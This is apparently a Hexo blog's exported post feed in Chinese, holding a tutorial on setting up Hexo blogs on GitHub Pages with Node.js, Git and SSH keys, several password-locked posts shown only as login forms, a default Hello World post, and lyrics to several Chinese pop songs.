<h4 id="2-3-搭建过程"><a href="#2-3-搭建过程" class="headerlink" title="2.3 搭建过程"></a><font color="#3CB371" face="Comic sans MS">2.3 搭建过程</font></h4><h5 id="步骤一、那就是先注册自己的Github账号了"><a href="#步骤一、那就是先注册自己的Github账号了" class="headerlink" title="步骤一、那就是先注册自己的Github账号了"></a><font color="#2196f3" face="Comic sans MS">步骤一、那就是先注册自己的Github账号了</font></h5><p>先看完下面文字再点击视频链接去注册。</p>
<blockquote>
<p>1.进入<a href="https://github.com/%E7%82%B9%E5%87%BB%E6%B3%A8%E5%86%8C%E3%80%82%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9%EF%BC%9A">https://github.com/点击注册。注意事项：</a><br>    1）一个用户名、邮箱只能注册一次；<br>    2）Github会限制浏览器，推荐Chrome、Firefox；<br>    3）邮箱验证，通过了才能继续下面事项。</p>
</blockquote>
<blockquote>
<p>2.关于取名：<br>    1）比如我的用户名是Treecatee,相应的仓库取名推荐为Treecatee.github.io，否则后续使用Treecatee.github.io在浏览器访问时报错404；那如果我非要取其他名可以么？可以的，比如我取名为Directoree.github.io，那么在浏览器输入应该为Treecatee/Directoree.github.io，这样就可以了，不过URL很长…..<br>    2）GitHub Pages 建好后需要将Branch改为master，然后在下面接着选一个theme，不然会访问不了Treecatee.github.io</p>
</blockquote>
<p><font face="宋体">&emsp;到<a href="https://github.com/">Github官网</a>注册账号，过程还是有些繁琐的，那就推荐到这个视频看看怎么注册吧…..<br><a href="https://www.bilibili.com/video/av24897960?p=2">Github注册账号视频（点我）</a>。 </font></p>
<h5 id="步骤二、-安装node-js"><a href="#步骤二、-安装node-js" class="headerlink" title="步骤二、 安装node.js"></a><font color="#2196f3" face="Comic sans MS">步骤二、 安装node.js</font></h5><p><font face="宋体">&emsp;<a href="https://nodejs.org/zh-cn/">官网下载</a>node，或者使用<a href="https://npm.taobao.org/">淘宝镜像源下载</a>。安装好了后到命令行试试是否成功安装了，方法：打开命令行（Win+R）,输入cmd，打开命令行后输入node -v，如果显示版本则安装成功，否则重新安装。  </font></p>
<h5 id="步骤三、-安装Git（第一坑）"><a href="#步骤三、-安装Git（第一坑）" class="headerlink" title="步骤三、 安装Git（第一坑）"></a><font color="#2196f3" face="Comic sans MS">步骤三、 安装Git（第一坑）</font></h5><p><font face="宋体">&emsp;1.网上的教程都是直接到<a href="https://git-scm.com/downloads">Git官网</a>直接下载，后来到了官网后发现官网根本就不能下载了，这不是坑人么？后来找了很多方法，发现官网已经停止维护更新了，那就得使用其他途径了。推荐<a href="https://npm.taobao.org/mirrors/git-for-windows/">淘宝镜像</a>，或者到CSDN搜索一下复制链接给淘宝客服帮助你下载（土豪行为）🤭<br>&emsp;2.安装好了后到命令行试试是否成功安装了，方法：打开命令行（Win+R）,输入cmd，打开命令行后输入git，如果显示有相应信息则安装成功，否则重新安装。<br></font></p>
<h5 id="步骤四、-使用Git创建SSH-RSA密钥复制到自己的Github仓库"><a href="#步骤四、-使用Git创建SSH-RSA密钥复制到自己的Github仓库" class="headerlink" title="步骤四、 使用Git创建SSH-RSA密钥复制到自己的Github仓库"></a><font color="#2196f3" face="Comic sans MS">步骤四、 使用Git创建SSH-RSA密钥复制到自己的Github仓库</font></h5><p><font face="宋体">&emsp;注意事项：生成密钥的过程会提示是否需要输入密码？按回车默认不需要就可以了，后面一个提示是生成的密钥的文件保存路径，你可以更改也可以不改。创建方法参见：<a href="https://www.bilibili.com/video/av24897960?p=4">点我看视频</a>。</font></p>
<h5 id="步骤五、-非常重要的一步，创建Hexo（第二坑）"><a href="#步骤五、-非常重要的一步，创建Hexo（第二坑）" class="headerlink" title="步骤五、 非常重要的一步，创建Hexo（第二坑）"></a><font color="#2196f3" face="Comic sans MS">步骤五、 非常重要的一步，创建Hexo（第二坑）</font></h5><blockquote>
<ol>
<li>建立一个Blog文件夹；</li>
<li>在Blog文件夹下右键选中Git Bash Here打开Git,输入更换安装源的路径命令<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code>，然后输入<code>npm install hexo-cli -g</code>-g是安装到全局；</li>
<li>安装好Hexo后，接着输入<code>hexo init Directoree</code>“Directoree”是博客名，这一步创建博客本地站点文件；Directoree文件夹被创建好后，将其复制一份到其他路径下，方便以后用；</li>
<li>到Blog/Directoree右键选中Git Bash Here打开Git,输入<code>npm install</code>安装依赖。</li>
</ol>
</blockquote>
<p><font face="宋体">&emsp;注意事项：Hexo创建不成功的话是无法搭建博客的，注意创建在目录的位置哦！创建方法参见：<a href="https://www.bilibili.com/video/av24897960?p=5">点我看视频</a>后发现创建失败啊。哈哈，那是因为目前国内npm源有问题，所以推荐使用淘宝镜像，代码参考<a href="https://www.cnblogs.com/qq597585136/p/6964599.html">关于HEXO安装失败的解决方法</a>，如果连接不能跳转则使用下面代码即可：</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line">cnpm install hexo-cli -g</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="宋体">&emsp;注意事项：Hexo依赖不成功安装的话是无法搭建博客的，注意创建在目录的位置哦！！！发现创建失败啊。哈哈，那是因为目前国内npm源有问题，所以推荐使用淘宝镜像，使用下面代码即可：</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<p><font face="宋体">&emsp;安装好了后就赶紧试试自己的第一篇博客文章吧，在命令行输入：hexo g -s 本地查看一下，参见<a href="https://www.bilibili.com/video/av24897960?p=5">视频</a>。<br></font></p>
<h5 id="步骤六、-下载安装Sublime-Text软件"><a href="#步骤六、-下载安装Sublime-Text软件" class="headerlink" title="步骤六、 下载安装Sublime Text软件"></a><font color="#2196f3" face="Comic sans MS">步骤六、 下载安装Sublime Text软件</font></h5><p><font face="宋体">&emsp;该软件用于编辑代码等，当然也可以使用其他软件，推荐<a href="https://www.sublimetext.com/">下载地址</a>，点击DOWNLOAD FOR WINDOWS。然后就可以编辑提交文章到自己的博客了啊。如果<code>hexo g</code>时报错远程端连接不上的话，是因为网络问题，多试几次就好了。<br>常用的提交命令：</font></p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">hexo</span> <span class="string">cl</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">g</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">s   （这个是本地查看）</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">d   （这个是部署到自己的博客）</span></span><br></pre></td></tr></table></figure>






<p>  哈哈哈，就这样自己的博客初步搭建好了</p>
<p><font face="楷体">  至于主题替换以及里面插件的使用后续再更吧……😊</font></p>
<p>&emsp;<br>&emsp;</p>
<h3 id="三、-搭建第二个博客"><a href="#三、-搭建第二个博客" class="headerlink" title="三、 搭建第二个博客"></a><font color="#FF6347" face="Comic sans MS">三、 搭建第二个博客</font></h3><p><font color="#FF7F00"><strong>创建多个博客其实按照逻辑来并不难，难点是在于远程部署文章的时候的解决方法。其实实际也就是使用本地RSA密钥要使用正确。</strong></font></p>
<blockquote>
<ol>
<li>注册GitHub账号；并注意这个时候的SSH-RSA密钥创建的时候我们可以另选一个路径先暂时保存一下，比如桌面；</li>
<li>Git、node.js不需要再次安装；</li>
<li>可以将上述复制的博客文件直接拿来用。<br> 1）如果没有复制。则需要检查Hexo是否在新的博客路径下可用，不可用的话重新在新的路径下安装，安装方法参照上面，安装好Hexo后，接着输入<code>hexo init Directoree</code>“Directoree”是博客名，接着安装依赖；<br> 2）如果复制了。需要再安装一个Hexo依赖，否则你会发现<code>hexo cl</code>等命令不能用。</li>
</ol>
</blockquote>
<p>&emsp;<br>&emsp;<br><strong>如果不解决RSA的问题报错如下：</strong></p>
<p><img data-src="https://i.loli.net/2019/02/26/5c74efb9ac932.png" alt="VF.png"></p>
<p>&emsp;<br>&emsp;<br><strong>解决方法：</strong><font color="red"><strong>部署哪一个博客就使用该博客对应的RSA密钥对！！！</strong></font><br>网上那些方法我都试了但是没有一个能解决实际情况，所以下面的解决方法绝对适用于每一个人！！！</p>
<p>&emsp;<br>保存RSA密钥的默认路径是<code>C:\Users\Alvin\.ssh</code>，可以看到里面的id_rsa、id_rsa.pub密钥对是第一个博客的，当我们需要部署第二个博客到远程仓库时就需要使用到第二个博客的密钥对，这个时候我们可以在<code>C:\Users\Alvin\.ssh</code>目录下建立一个文件夹，例如建立<code>用于更换</code>文件夹，将暂时不用的密钥对移动到里面，将需要使用到的密钥对放到<code>C:\Users\Alvin\.ssh</code>目录下即可。<br>&emsp;</p>
<blockquote>
<p>为什么要这样？<br>那是因为密钥对可以选择使用，但是部署到远程仓库是使用的密钥对文件名字必须为<code>id_rsa、id_rsa.pub</code></p>
</blockquote>
<br>

<p><img data-src="https://i.loli.net/2019/02/27/5c76836c999aa.png" alt="B.png"></p>
<p>更换后第二个博客部署成功了，如下：<br><img data-src="https://i.loli.net/2019/02/26/5c74f1f7aad0c.png" alt="O.png"></p>
<p>&emsp;<br>哈哈哈哈(。・∀・)ノ</p>
]]></content>
      <categories>
        <category>Hexo-Github</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>CS:APP Data Lab</title>
    <url>/post/csapp_datalab/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="c1cc843279e138803297534d9e713fdad7d4f99db3a8c74b5e017f48b785a1e9"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CS:APP</category>
      </categories>
      <tags>
        <tag>CS:APP</tag>
        <tag>逆向</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>闲谈Docker😄</title>
    <url>/post/docker-github/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="1be5da2071dd394bce122c17a62f9fb18a7135c47249792ff8c069669ef825fb"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker</title>
    <url>/post/docker/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="63256b601aae7350f323a0fb004c9d09794d359690199aa11e9e32acb41aaf80"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/post/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>博客主题更新</title>
    <url>/post/updatetheme/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="d8d59a53f04703e6d16c99a7b3739c3eb91ea5312d29fbdadeb86e4bd4d16418"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE-XML</title>
    <url>/post/xxe-xml-dtd/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="9d6a2d099d99b723f337179de37498763ba8f2162f16e6d5d737357afaa28f2e"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>XXE</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>XXE</tag>
        <tag>XML</tag>
      </tags>
  </entry>
  <entry>
    <title>叶雪如-《水星记》《体面》收藏版</title>
    <url>/post/%E5%8F%B6%E9%9B%AA%E5%A6%82-%E3%80%8A%E6%B0%B4%E6%98%9F%E8%AE%B0%E3%80%8B%E3%80%8A%E4%BD%93%E9%9D%A2%E3%80%8B%E6%94%B6%E8%97%8F%E7%89%88/</url>
    <content><![CDATA[<p><font face="楷体"><strong>《水星记》</strong></font></p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=551971760&auto=0&height=66"></iframe>
&emsp;[Music Video](https://music.163.com/video?id=DDEBA0F86AE2F084FC5084286D5886A1)
&nbsp;
<font face="楷体">**《体面》**</font>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=3&id=1369442255&auto=0&height=66"></iframe>
&emsp;[Music Video](https://music.163.com/#/video?id=53D34649111D82B977A09F4F2A1ED3BB&userid=455041480)  
![FSbHUS.md.jpg](https://s1.ax1x.com/2018/11/19/FSbHUS.jpg)
<font face="楷体">**叶雪如**</font>&emsp;[微博](https://weibo.com/irisyxr?topnav=1&wvr=6&topsug=1&is_hot=1)&emsp;[唱吧](https://changba.com/u/238069476)&emsp;[网易云音乐](https://music.163.com/#/artist?id=12457100) 
&nbsp;
<center><font face="楷体">
</font>

<h6 id="《水星记》"><a href="#《水星记》" class="headerlink" title="《水星记》"></a><center><font face="楷体">《水星记》</font></h6><center><font face="楷体">
作曲 : 郭顶
作词 : 郭顶
水星记 - 郭顶
词：郭顶
曲：郭顶
COVER-叶雪如
着迷于你眼睛
银河有迹可循
穿过时间的缝隙
它依然真实地
吸引我轨迹
这瞬眼的光景
最亲密的距离
沿着你皮肤纹理 走
过曲折手臂
做个梦给你
做个梦给你
等到看你银色满际
等到分不清季节更替
才敢说沉溺
还要多远才能进入你的心
还要多久才能和你接近
咫尺远近却
无法靠近的那个人
也等着和你相遇
环游的行星
怎么可以
拥有你
这瞬眼的光景
最亲密的距离
沿着你皮肤纹理
走过曲折手臂
做个梦给你
做个梦给你
等到看你银色满际
等到分不清季节更替
才敢说沉溺
还要多远才能进入你的心
还要多久才能和你接近
咫尺远近却
无法靠近的那个人
也等着和你相遇
环游的行星
怎么可以
拥有你
还要多远才能进入你的心
还要多久才能和你接近
咫尺远近却无法靠近的那个人
要怎么探寻
要多么幸运
才敢让你发觉你并不孤寂
当我还可以再跟你飞行
环游是无趣
至少可以
陪着你
</font>


<p>&nbsp;<br>&nbsp;<br>&nbsp;</p>
<h6 id="《体面》"><a href="#《体面》" class="headerlink" title="《体面》"></a><center><font face="楷体">《体面》</font></h6><center><font face="楷体">
别堆砌怀念让剧情变得狗血
深爱了多年又何必毁了经典
都已成年不拖不欠
浪费时间是我情愿
像谢幕的演员
眼看着灯光熄灭
来不及再轰轰烈烈
就保留告别的尊严
我爱你不后悔
也尊重故事结尾
分手应该体面
谁都不要说抱歉
何来亏欠
我敢给就敢心碎
镜头前面是
从前的我们在喝彩
流着泪声嘶力竭
离开也很体面
才没辜负这些年
爱得热烈
认真付出的画面
别让执念毁掉了昨天
我爱过你利落干脆
最熟悉的街主角却换了人演
我哭到哽咽
心再痛就当破茧
来不及再轰轰烈烈
就保留告别的尊严
我爱你不后悔
也尊重故事结尾
分手应该体面
谁都不要说抱歉
何来亏欠
我敢给就敢心碎
镜头前面是
从前的我们在喝彩
流着泪声嘶力竭
离开也很体面
才没辜负这些年爱得热烈
认真付出的画面
别让执念毁掉了昨天
我爱过你利落干脆
再见不负遇见
</font>

<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
<iframe src="//player.bilibili.com/player.html?aid=21210560&cid=34835011&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>
]]></content>
      <categories>
        <category>音乐</category>
      </categories>
  </entry>
  <entry>
    <title>杨宗纬-《空白格》专辑</title>
    <url>/post/%E6%9D%A8%E5%AE%97%E7%BA%AC-%E3%80%8A%E7%A9%BA%E7%99%BD%E6%A0%BC%E3%80%8B%E4%B8%93%E8%BE%91/</url>
    <content><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="//music.163.com/outchain/player?type=1&id=3044089&auto=0&height=90"></iframe>

<center><font face="楷体">
作曲 : 蔡健雅
作词 : 蔡健雅
其实很简单其实很自然
两个人的爱由两人分担
其实并不难是你太悲观
隔着一道墙不跟谁分享
不想让你为难
你不再需要给我个答案
我想你是爱我的
我猜你也舍不得
但是怎么说总觉得
我们之间留了太多空白格
也许你不是我的
爱你却又该割舍
分开或许是选择
但它也可能是我们的缘分
我想你是爱我的
我猜你也舍不得
但是怎么说总觉得
我们之间留了太多空白格
也许你不是我的
爱你却又该割舍
分开或许是选择
但它也可能是我们的缘分
但它也可能是我们的缘分
</font>

<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
]]></content>
      <categories>
        <category>音乐</category>
      </categories>
  </entry>
  <entry>
    <title>薛之谦-《怪咖》专辑</title>
    <url>/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E6%80%AA%E5%92%96%E3%80%8B%E4%B8%93%E8%BE%91/</url>
    <content><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="//music.163.com/outchain/player?type=2&id=574921549&auto=0&height=66"></iframe>

<center><font face="楷体">
作曲 : 薛之谦
作词 : 薛之谦
你的改变 很难制止了
我的取悦 也不是天生的
熟练了 喜怒就合并了
你的理由是星星点点的
我尽量充当气氛营造者
练就成了 无痛的角色
再听多几次分开的话
越致命越不正面回答
感情里的怪咖 有铺垫就不尴尬
所以要找个延期方法
既平静还能突然挣扎
我自愿作怪咖 就不怕被你笑话
你的铺垫 零零散散的
别去揭穿 话题制造者
我记得 你也会不舍
我偶尔取悦也会失手的
搞笑的人变成做恶的
我习惯了 无痛的货色
再听多几次分开的话
越致命越不正面回答
感情里的怪咖 有铺垫就不尴尬
所以要找个延期方法
既平静还能突然挣扎
我自愿作怪咖 就不怕被你笑话
你还有几次分开的话
新鲜感不佳词语匮乏
感情里的怪咖 可手里也没筹码
所以要找个缓冲方法
直到有天我也放得下
我不是个怪咖 是不计较的惩罚
感情里的怪咖 再难过也笑着说吧
</font>

<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
]]></content>
      <categories>
        <category>音乐</category>
      </categories>
  </entry>
  <entry>
    <title>薛之谦-《最好》专辑</title>
    <url>/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E6%9C%80%E5%A5%BD%E3%80%8B%E4%B8%93%E8%BE%91/</url>
    <content><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="//music.163.com/outchain/player?type=2&id=1294910785&auto=0&height=66"></iframe>

<center><font face="楷体">
作曲 : 林倛玉/郭顶
作词 : 小寒/廖慧明/郭顶
最好就这样能把你忘掉
最好能不想还有多困扰
这复杂的情绪向我奔跑
由来已经太少 或者已经无药</font>
<center><font face="楷体">
最好的都已经送你不要
最好的朋友说我太无聊
最好的方式也只能这样
反正你不要了 都好
说不清他比我适合 适合这种时刻</font>
<center><font face="楷体">
还是他比我懂得更让你快乐
也许没资格 也只能怀念了
我懂 没有意外了
或许他比较适合 适合这种值得
他说他比我懂得更让你快乐
最好 不要记得我</font>
<center><font face="楷体">
最好的都已经送你不要
最好的朋友说我太无聊
最好的方式也只能这样
反正你不要了 都好</font>
<center><font face="楷体">
说不清他比我适合 适合这种时刻
还是他比我懂得更让你快乐
也许没资格 也只能怀念了
我懂 没有意外了</font>
<center><font face="楷体">
或许他比较适合 适合这种值得
他说他比我懂得更让你快乐
最好 不要记得
最好 不要记得
最好 不要记得我</font>
<center><font face="楷体">
制作人：郭顶
编曲：陈迪
钢琴/贝斯/吉他：陈迪
弦乐录音：国际首席爱乐乐团/Memory Time Studio,beijing
鼓 : 钟健
鼓录音: 于昊/Tweak Tone Labs（beijing）
录音 : 刘灵/Big.J Studio, Beijing
音频编辑 : 赵靖/郭顶
混音: 赵靖/Big.J Studio, Beijing
OC/OA ：小寒*&廖慧明*&郭顶(OA)/林倛玉*&郭顶(OC)
OP：Funkie Monkies Publishing Pte Ltd (Warner/Chappell Music Taiwan Ltd.)
OP：北京享耳音乐文化有限公司
SP：Warner/Chappell Music Publishing Agency (Beijing) Ltd.
SP：北京享耳音乐文化有限公司
母带工程师: 姜升熙 Seunghee Kang@SONIC KOREA MASTERING
</font>
&nbsp;
&nbsp;
&nbsp;
&nbsp;]]></content>
      <categories>
        <category>音乐</category>
      </categories>
  </entry>
  <entry>
    <title>薛之谦-《渡》专辑</title>
    <url>/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E6%B8%A1%E3%80%8B%E4%B8%93%E8%BE%91/</url>
    <content><![CDATA[<p>&nbsp;</p>
<h5 id="《渡》专辑"><a href="#《渡》专辑" class="headerlink" title="《渡》专辑"></a><font face="楷体">《渡》专辑</font></h5><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=450 src="//music.163.com/outchain/player?type=1&id=36855053&auto=0&height=430"></iframe>



<p>&nbsp;</p>
<h6 id="《动物世界》"><a href="#《动物世界》" class="headerlink" title="《动物世界》"></a><center><font face="楷体">《动物世界》</font></h6><center><font face="楷体">
作曲 : 郭顶
作词 : 薛之谦
东打一下西戳一下
动物未必需要尖牙
示爱的方法有礼貌或是我管它
要将情人一口吞下
还要显得温文尔雅
螳螂委屈的展示旧伤疤
求偶时候一惊一乍
因为害怕时常倒挂
走投无路的情况下舍弃了尾巴
如果不能将它同化就寄生于它 大不了一同腐化
努力进化 笑动物世界都太假
祖先 已磨去爪牙
相爱相杀 一定有更好的办法
攀比一下 谁先跪下
不再进化 动物世界里都太傻
为情表现到浮夸
得到了你就该丢下 人性来不及粉刷
所以啊 人总患孤寡
麋鹿本来约在树下
说好一起浪迹天涯
系上铃铛还在往那个方向挣扎
如果有只豺狼它英勇披上婚纱 同伴笑他读过童话
别再进化 别让动物世界太假
我们 该露出爪牙
相爱相杀 别再想更好的办法
优胜劣汰 自舔伤疤
假装进化 拼命想和动物有差
玩一出高贵优雅
在人们腐烂的欲望下 兽性来不及抹杀
算了吧 懒得去挣扎
人类用沙 想捏出梦里通天塔
为贪念不惜代价
驾驭着昂贵的木马 巢穴一层层叠加
最后啊 却一丝不挂 别害怕 我们都孤寡
制作人：郭顶
编曲/钢琴/贝斯：陈迪
鼓：王斌
弦乐：国际首席爱乐乐团
第一小提琴：李朋 王大毛庞阔 张浩 杨爽 李曦 刘潇 高言 杨思宇 倪冰雪
第二小提琴：简蓓 阎红 张晨迪 唐昕 侯宇红 张雷 徐文超
中提琴：何辉 毕芳 武文豪 陈欣欣 王羽沛
大提琴：张平 郎莹 陈俊杰 孙艺 邵鑫
低音提琴：周旭 段然
录音：汝文博 （Big J Studio. beijing.)
混音：赵靖（Big J Studio. beijing.）
母带：Tom Coyne （Sterlingsound NYC.）</font>

<p>&nbsp;<br>&nbsp;<br>&nbsp;</p>
<h6 id="《暧昧》"><a href="#《暧昧》" class="headerlink" title="《暧昧》"></a><center><font face="楷体">《暧昧》</font></h6><center><font face="楷体">
作曲 : 薛之谦
作词 : 薛之谦
反正现在的感情 都暧昧
你大可不必为难 找般配
付出过的人排队 谈体会
趁年轻别害怕一个人睡
可能是现在感情 太昂贵
让付出真心的人 好狼狈
还不如听首情歌 的机会 忘了谁
感情像牛奶一杯 越甜越让人生畏
都早有些防备 润色前的原味
所以人们都拿起咖啡 把试探放在两人位
距离感一对 就不必再赤裸相对
反正现在的感情 都暧昧
你大可不必为难 找般配
付出过的人排队 谈体会
弃之可惜 食而无味
可能是现在感情 太珍贵
让付出真心的人 好疲惫
谁不曾用过卑微的词汇 想留住谁
还贪恋着衣衫昂贵 却输给了廉价香水
他先诱你入位 还刻意放低了分贝
可感情越爱越妩媚 像烂掉的苹果一堆
连基因都不对 还在意什么鱼腥味
反正现在的感情 都暧昧
你大可不必为难 找般配
何必给自己沉迷 的机会
不如用误会来结尾
反正现在的我们 算暧昧
我愿意给的感情 请浪费
反正流过的眼泪 难收回
就别再安慰
看你入眠的侧脸 有多美
和你丢下的一切 好匹配
我还以为我能 多狼狈
我自以为
制作人：郑伟
编曲：薛之谦 郑伟
混音：郑伟
大提琴：周润青
女声：孟楠
合音：薛之谦 张石狄
录音：莫家伟
母带：Chris Gehringer






</font>
&nbsp;
&nbsp;
&nbsp;
###### <center><font face="楷体">《像风一样》</font>
<center><font face="楷体">
作词：薛之谦
作曲：薛之谦
我等的模样好不具象
用皮肤感受你的流向
你竟然能做到带走阳光
我一味的跟随过了量
像风一样
你靠近云都下降
你卷起千层海浪我躲也不躲往里闯
你不就像风一样
侵略时沙沙作响
再宣布恢复晴朗就好像我们两个没爱过一样
曲折的夕阳负责格挡
让委屈的感官无法释放
最近我的伤口没生长
因为我躲在没风的地方
像风一样
你靠近云都下降
你卷起千层海浪我躲也不躲往里闯
你不就像风一样
侵略时沙沙作响
再宣布恢复晴朗就好像我们两个没爱过一样
你像风一样
触摸时温柔流淌
席卷我所有抵抗不急着要我投降
你不就像风一样
掠夺时沙沙作响
可惜我自投罗网你也就没什么可骄傲的地方
和风一样
你离开不声不响
我喜欢这种收场看上去谁也不曾亏欠过对方
制作人：薛之谦
编曲：张宝宇 郑伟
混音：郑伟
合音：薛之谦
鼓：褚伟明
bass：宣一亨
吉他：孙闻楠
人声录制：莫家伟（上海广播大厦200studio）
乐器录制：吴身宝（soundhub studio）
母带制作：Ted Jensen</font>

<p>&nbsp;<br>&nbsp;<br>&nbsp;</p>
<h6 id="《高尚》"><a href="#《高尚》" class="headerlink" title="《高尚》"></a><center><font face="楷体">《高尚》</font></h6><center><font face="楷体">
作曲 : 周以力
作词 : 薛之谦
Vocal录音室：江苏广电总台录音室
乐器录音室：北京录顶技录音室
乐器录音师：王晓海；鲍锐（鼓）
混音工程师：鲍锐@录顶技Studio
母带工程师：Friedemann Tishmeyer@Hambug Studio
在阴郁的地方 积攒能量
人交出了什么 能变个样
奇形怪状 的人在生长
我躲在人群中 头在晃
刺破我的心脏 样本不算肮脏 别恐慌
你看我虚荣模样 你该怎么补偿
我多高尚 向自尊开了枪
你同情的眼光 我特别的欣赏
哀而不伤
我多慌张 怕人闯入我围墙
窥探五官不详 见我原本模样
还能 模仿 任何形状
越恶劣的情况 越要想象
狼藏起反犬旁 像从了良
张牙舞爪 的人在散谎
愿形容我的词 别太荒唐
贪念表现恰当 就像索要嫁妆 在情理上
请当我孤芳自赏 还规矩条条框框
我多高尚 向自尊开了枪​
你异样的眼光 我特别的欣赏
